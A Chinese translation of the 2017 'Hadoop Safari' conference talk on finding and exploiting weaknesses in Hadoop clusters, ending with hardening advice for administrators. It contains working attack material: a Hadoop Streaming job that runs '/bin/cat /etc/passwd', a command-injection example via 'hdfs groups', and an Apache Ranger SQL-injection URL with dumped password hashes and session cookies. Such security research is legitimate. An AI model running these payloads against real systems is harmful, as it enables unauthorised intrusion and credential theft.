<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<title>挖掘分布式系统——Hadoop的漏洞</title>
</head>
<body>
<p><a href="https://zhuanlan.zhihu.com/p/28901633">原文</a></p>
<div class="title-image"><img src="https://pic4.zhimg.com/v2-be1fe2461d96a0de113de80d3b45e5b7_r.jpg" alt=""></div><h2><b>Hadoop及其安全模型概述</b></h2><p><br></p><h2><b>Hadoop简述</b></h2><p><br>Hadoop是一款由Apache基金会推出的分布式系统框架，它通过著名的 <b>MapReduce</b> 算法进行分布式处理。这个框架被Adobe，Last fm，EBay，Yahoo等知名公司使用着。它极大地精简化程序员进行分布式计算时所需的操作，用户大概通过如下步骤在hadoop中实现分布式处理：</p><ul><li>用户创建一个处理键值的map函数</li><li>产生了一套中间键/值</li><li>reduce函数合并中间值并把他们关联到对应的键 </li></ul><img src="https://pic1.zhimg.com/v2-607502035062606c17ac4953362ae442_r.png" data-rawwidth="856" data-rawheight="594"><p><br>虽说hadoop是免费且开源的，它还是分出了许多发行版，以下是三个最受欢迎的发行版：<br> </p><img src="https://pic1.zhimg.com/v2-be1fe2461d96a0de113de80d3b45e5b7_r.png" data-rawwidth="1768" data-rawheight="500"><p><br>幸运的是，这三个版本都是基于Hadoop的，所以它们都大同小异。<br> <br>这副图大致描述了Hadoop在大数据框架中的位置：</p><p><br></p><img src="https://pic2.zhimg.com/v2-a1bfebd92533f78d2e3d56a6ec527e3b_r.png" data-rawwidth="1302" data-rawheight="760"><p><br>显而易见，Hadoop在大数据环境中负责最底层的操作。图中的MapReduce负责数据处理。HDFS则是一种特殊的文件系统，其用来存储Hadoop里的数据。而在这两者之上的Yarn是Hadoop集群的资源管理器。<br> </p><h2><b>安全模型</b></h2><p><br></p><h2><b>身份验证</b></h2><p><br>默认情况下，Hadoop集群不强制管理员添加身份验证。就算开了默认的身份验证（但是没有用Kerberos)，它也只是简单地检查一下登陆的用户及其所在组是合法的。</p><p><br></p><img src="https://pic3.zhimg.com/v2-a479216274ad1d674609d901f9001925_r.png" data-rawwidth="1160" data-rawheight="114"><p><br>有些时候，由于管理员疏忽，验证可能只会在部分模块打开。下面的配置文件分别描述了不同情况：<br> <br>全部都需认证：</p><code lang="xml">&lt;name&gt;hadoop.security.authentication&lt;/name&gt;
&lt;value&gt;simple&lt;/value&gt;
&lt;source&gt;core-default.xml&lt;/source&gt;
</code><p><br>只在Web接口验证：</p><code lang="xml">&lt;name&gt;hadoop.http.authentication.type&lt;/name&gt;
&lt;value&gt;simple&lt;/value&gt;
&lt;source&gt;core-default.xml&lt;/source&gt;
</code><p><br>可匿名登陆：</p><code lang="xml">&lt;name&gt;hadoop.http.authentication.simple.anonymous.allowed&lt;/name&gt;
&lt;value&gt;simple&lt;/value&gt;
&lt;source&gt;core-default.xml&lt;/source&gt;
</code><p><br>只在Yarn上开启身份验证：</p><code lang="xml">&lt;name&gt;yarn.timeline-service.http-authentication.simple.anonymous.allowed&lt;/name&gt;
&lt;value&gt;simple&lt;/value&gt;
&lt;source&gt;core-default.xml&lt;/source&gt;
</code><p><br>不仅如此，每个Hadoop组件都有自己的认证模块，这无疑大大提升了防御的复杂度。<br> <br>就拿HDFS来说，它同时支持*nix式权限（user/group/other）和ACL（2.5后加入）<br>!</p><img src="https://pic4.zhimg.com/v2-93b9cb3267ae385fc13239318b3442cd_r.png" data-rawwidth="906" data-rawheight="346"><p><br></p><h2><b>数据保护</b></h2><p><br>默认情况下（不开Kerberos），传输及存储的数据不会被加密保护。不过我们这里主要来谈一谈开启加密的状况，我们大致可以分成两种：</p><ul><li>传输加密：<br>  在NameNode会有三种保护：第一种仅确认身份正确，而第二种额外保证信息完整性，第三种会加密所有数据。在所有Web应用中，SSL/TLS是默认打开的。DataNode则会使用AES加密数据并用RC4/3DES交换密匙。</li><li>存储加密：<br>  Hadoop用Encryption Zone来保护目录并且每一个文件都有独特的密匙。<br> </li></ul><h2><b>如何Pwn掉Hadoop</b></h2><p><br></p><h2><b>探索攻击面</b></h2><p><br>一般来讲，Hadoop集群有这三种布置方案：<br> </p><ul><li>完全暴露</li></ul><img src="https://pic1.zhimg.com/v2-13f69a06fb86d2f0d625f2e701778eaf_r.png" data-rawwidth="563" data-rawheight="301"><p>这种情况下，攻击面十分广阔。攻击者更有可能非法获取数据。<br> </p><ul><li>只有用户服务暴露</li></ul><img src="https://pic1.zhimg.com/v2-e7f1d8039e77889159d9199da5a3ed23_r.png" data-rawwidth="568" data-rawheight="576"><p>相对于前一种情况，攻击面大大减少了，而且必须要找到用户凭证或者Web漏洞才能进一步探索集群。<br> </p><ul><li>高度隐匿</li></ul><img src="https://pic1.zhimg.com/v2-4d9b3f062c424e2686185a16827b2c25_r.png" data-rawwidth="558" data-rawheight="740"><p>这种情况的攻击面被最小化了。攻击者需要想方设法才能进入Hadoop设施。<br> <br>我们再来给端口分一下类：<br> <br>NameNode的常规服务：</p><code lang="text">-- HDFS
TCP / 8020: HDFS metadata
  $ hadoop fs -ls /tmp
 
HTTP / 50070 (50470): HDFS NameNode WebUI
  $ HDFS WebUI explorer at /explorer.html
  $ Redirecting actual data access to DataNode on port 50075
 
HTTP / 50090: Secondary NameNode WebUI
  $ Fewer stuff than the primary on TCP / 50070
 
-- YARN / MapReduce v2
TCP / 8030-3: YARN job submission
HTTP / 8088 (8090): YARN ResourceManager WebUI
HTTP / 19888 (19890): MapReduce v2 JobHistory Server WebUI
 
--  MapReduce v1 --
TCP / 8021: MapReduce v1 job submission
HTTP / 50030: MapReduce v1 JobTracker
</code><p><br>DataNode的常规服务：</p><code lang="text">-- HDFS
TCP / 8020: HDFS metadata
  $ hadoop fs -ls /tmp
HTTP / 50070 (50470): HDFS NameNode WebUI
  $ HDFS WebUI explorer at /explorer.html
  $ Redirecting actual data access to DataNode on port 50075
HTTP / 50090: Secondary NameNode WebUI
  $ Fewer stuff than the primary on TCP / 50070
 
-- YARN / MapReduce v2
TCP / 8030-3: YARN job submission
HTTP / 8088 (8090): YARN ResourceManager WebUI
HTTP / 19888 (19890): MapReduce v2 JobHistory Server WebUI
 
-- MapReduce v1 --
TCP / 8021: MapReduce v1 job submission
HTTP / 50030: MapReduce v1 JobTracker
</code><p><br>除此之外，我们还需留心以下第三方服务：</p><code lang="text">HTTP / 14000: HTTPFS WebHDFS
HTTP / 8443: Apache KNOX
HTTP / 7180 (7183): Cloudera Manager
HTTP / 8080: Apache Ambari
HTTP / 6080: Apache Ranger
HTTP / 8888: Cloudera HUE
HTTP / 11000: Oozie Web Console
</code><p><br>我们应该如何探测这些端口呢？之前对这些端口的支持很不友好，直到17年三月的一次commit，我们才能用nmap的http-enum脚本检测出这些服务：</p><code lang="text">/ Apache Ambari
/ Apache Oozie
/ Apache Ranger
/ Cloudera HUE
/ Cloudera Manager
/ Hadoop MapReduce v2
/ Hadoop YARN Node Manager and Resource Manager
</code><p><br>nmap探测实例：</p><code lang="text">$ nmap -sV --script=http-enum -p- 192.168.11.150
PORT STATE SERVICE
 
6080/tcp open http
| http-enum:
|_ /login.jsp: Apache Ranger WebUI
 
8042/tcp open http
| http-enum:
|_ /node: Hadoop YARN Node Manager version 2.7.1.2.4.0.0-169,
Hadoop version 2.7.1.2.4.0.0-169
 
8080/tcp open http
| http-enum:
|_ /: Apache Ambari WebUI
 
8088/tcp open http
| http-enum:
|_ /cluster/cluster: Hadoop YARN Resource Manager version
2.7.1.2.4.0.0-169, state "started", Hadoop version 2.7.1.2.4.0.0-169
 
19888/tcp open http
| http-enum:
|_ /jobhistory: Hadoop MapReduce JobHistory WebUI
</code><p><br></p><h2><b>任意数据获取</b></h2><p><br>WebHDFS提供REST API来给用户提供数据，在它只开启简单认证的情况下，我们仅需要提交user.name参数，即可获取任意数据。因此它成为了攻击目标的不二之选。那么我们如何找到这个服务呢？通常来讲，它会提供HDFS DataNode WebUI（默认端口50075）。或者可以在HTTPFS moudule（端口14000）及Apache KNOX（端口8443）找到该服务。<br> (PS：作者此处用 了自己写的脚本hdfsbrowser自动化攻击化，他在<a href="https://github.com/wavestone-cdt/hadoop-attack-library%E7%BB%99%E5%87%BA%E4%BA%86%E6%9B%B4%E5%A4%9Ahadoop%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E8%84%9A%E6%9C%AC%E3%80%82%EF%BC%89">https://github.com/wavestone-cdt/hadoop-attack-library给出了更多hadoop漏洞利用脚本。）</a></p><img src="https://pic1.zhimg.com/v2-9a1f5204aff0b626a3a3b7e92df9870a_r.png" data-rawwidth="758" data-rawheight="291"><p><br></p><p>我们甚至只需简单地在CLI中输入export HADOOP_USER_NAME=&lt;想要的用户名&gt;，即可进行越权访问：</p><img src="https://pic1.zhimg.com/v2-1d404a01566aa31586da005b887b752d_r.png" data-rawwidth="1457" data-rawheight="667"><p><br></p><h2><b>节点的RCE</b></h2><p><br>Hadoop是一款分布式 <b>处理</b> 框架，它最重要的地方是 <b>执行任务</b>。当一个节点的ip过滤不当或者认证不严时，我们可以让它执行任意命令。<br> <br>我们也不用操心Java代码。Hadoop Streaming能让我们在MapReduce中运行CLI命令：</p><code lang="text">#创建任务
$ hadoop \
  jar &lt;path_to_hadoop_streaming.jar&gt; \
    -input /non_empty_file_on_HDFS \
    -output /output_directory_on_HDFS \
    -mapper "/bin/cat /etc/passwd" \
    -reducer NONE
 
#检查是否有结果
$ hadoop fs –ls /output_directory_on_HDFS
 
#输出结果
$ hadoop fs –cat /output_directory_on_HDFS/part-00000
root:x:0:0:root:/root:/bin/bash
bin:x:1:1:bin:/bin:/sbin/nologin
</code><p><br>由于分布式的特性，我们并不清楚具体哪个节点在执行我们的payload，因此我们需要想方设法得到配置文件。最简单的方法是直接在原生WebUI(HDFS WebUI/ JobHistory/ ResourceManager)中请求/conf:</p><img src="https://pic2.zhimg.com/v2-d63b775a36d097e7855745fe1103b7a2_r.png" data-rawwidth="508" data-rawheight="217"><p><br>如果前一种方法失效了，我们就需要利用第三方Web管理平台的漏洞了。比如说Cloudera Manager未授权下载漏洞：</p><img src="https://pic4.zhimg.com/v2-e00c78f6c63d1a7344e6f32bd0fa4bfd_r.png" data-rawwidth="993" data-rawheight="366"><p><br></p><h2><b>攻击Hadoop组件</b></h2><p><br>在Hadoop 2.6.x &lt; 2.6.5和2.7.x &lt; 2.7.3中，只要hdfs用户在hadoop.security.group.mapping中有org.apache.hadoop.security.ShellBasedUnixGroupsMapping，他就可以执行任意命令。比方说：</p><img src="https://pic1.zhimg.com/v2-13979c49c3beedda7f35cebcc5cfb4e1_r.png" data-rawwidth="828" data-rawheight="235"><p><br>我们便可以:</p><code lang="text">unprivilegeduser$ hdfs groups '$(ping 127.0.0.1)'
unprivilegeduser$ ps aux|grep "ping 12"
...
hdfs 6227 0.0 0.0 15484 764 ? S 13:24 0:00 bash -c id -gn $(ping 127.0.0.1)&amp;&amp; id -Gn $(ping 127.0.0.1)
hdfs 6228 0.0 0.0 14732 868 ? S 13:24 0:00 ping 127.0.0.1
</code><p><br>虽然ShellBasedUnixGroupsMapping不是默认组件，但还是有许多安全意识不足的管理员启用了它：</p><img src="https://pic3.zhimg.com/v2-6ac61e637ded677791b4a7c0458defcd_r.png" data-rawwidth="1094" data-rawheight="790"><p><br></p><h2><b>攻击第三方模块</b></h2><p><br>第三方组件往往也会带来许多安全问题，比方说一个后台注入（CVE-2016-2174）：<br>GET http://&lt;apache_ranger_IP&gt;:6080/service/plugins/policies/eventTime?eventTime=' or '1'='1&amp;policyId=1<br> <br>这样，我们就能dump密码：</p><code lang="text">&gt; select last_name, first_name, email, login_id, password, user_role from x_portal_user,
x_portal_user_role where x_portal_user.id = x_portal_user_role.user_id limit 3 :
 
[*] , Admin, , admin, ceb4f32325eda6142bd65215f4c0f371, ROLE_SYS_ADMIN
[*] , rangerusersync, 1457692398755_962_66, ambari-qa, 70b8374d3dfe0325aaa5002a688c7e3b, ROLE_SYS_ADMIN
[*] , keyadmin, 1457692592328_160_91, amb_ranger_admin, a05f34d2dce2b4688fa82e82a89ba958,ROLE_KEY_ADMIN
</code><p><br>甚至session cookies：</p><code lang="text">&gt; select auth_time, login_id, ext_sess_id from x_auth_sess where auth_status = 1 or (login_id like
'%admin%' and auth_status = 1) order by auth_time desc limit 3 :
[*] 2016-05-08 13:30:11, admin, DEC6C0A899BB2E8793ABA9077311D8E6
[*] 2016-05-08 13:04:15, stduser, CD4142620CB7ED4186274D53B8E0D59E
[*] 2016-05-08 13:01:26, rangerusersync, D84D98B58FC0F9554A4CABF3E205A5E8N
</code><p><br>大部分的Hadoop集群会选择用Cloudera HUE做数据可视化，它的配置文件hue.ini默认可被任意读取。幸运的话，我们能够发现身份凭证：</p><img src="https://pic3.zhimg.com/v2-6a409a667262ac2a1b9ffa6547f41331_r.png" data-rawwidth="522" data-rawheight="501"><p><br>虽然我们汇报了这个问题给Cloudera，但他们并不打算修复这些漏洞。<br> </p><h2><b>总结</b></h2><p><br>我们可以发现，攻破Hadoop集群并不是非常难。这主要是因为默认安全机制的不严格，以及生态环境的复杂性而导致的。不仅如此，各大发行版也存在许多传统漏洞。为此，我呼吁各位管理员：</p><ul><li>全面开启Kerberos</li><li>避免让服务在公网中暴露</li><li>不要在边缘节点布置应用</li><li>正确配置Kerberos keyabs的权限</li><li>尽早更新软件</li></ul><p><br></p><p><i>作者：<b>Thomas DEBIZE, Mahdi BRAIK ——— <a href="https://gsec.hitb.org/materials/sg2017/COMMSEC%20D1%20-%20Thomas%20Debize%20and%20Mahdi%20Braik%20-%20Hadoop%20Safari%20-%20Hunting%20for%20Vulnerabilities.pdf">https://gsec.hitb.org/materials/sg2017/COMMSEC%20D1%20-%20Thomas%20Debize%20and%20Mahdi%20Braik%20-%20Hadoop%20Safari%20-%20Hunting%20for%20Vulnerabilities.pdf</a></b></i></p>
<script async defer="defer" src="https://www.googletagmanager.com/gtag/js?id=UA-7909075-5"></script>
<script>
window.dataLayer = window.dataLayer || [];
function gtag(){ dataLayer.push(arguments); }
gtag('js', new Date());
gtag('config', 'UA-7909075-5');
</script>
<script>
var _hmt = _hmt || [];
</script>
<script async defer="defer" src="https://hm.baidu.com/hm.js?e3d40295e416616ddc21287da9646d31"></script>
</body>
</html>
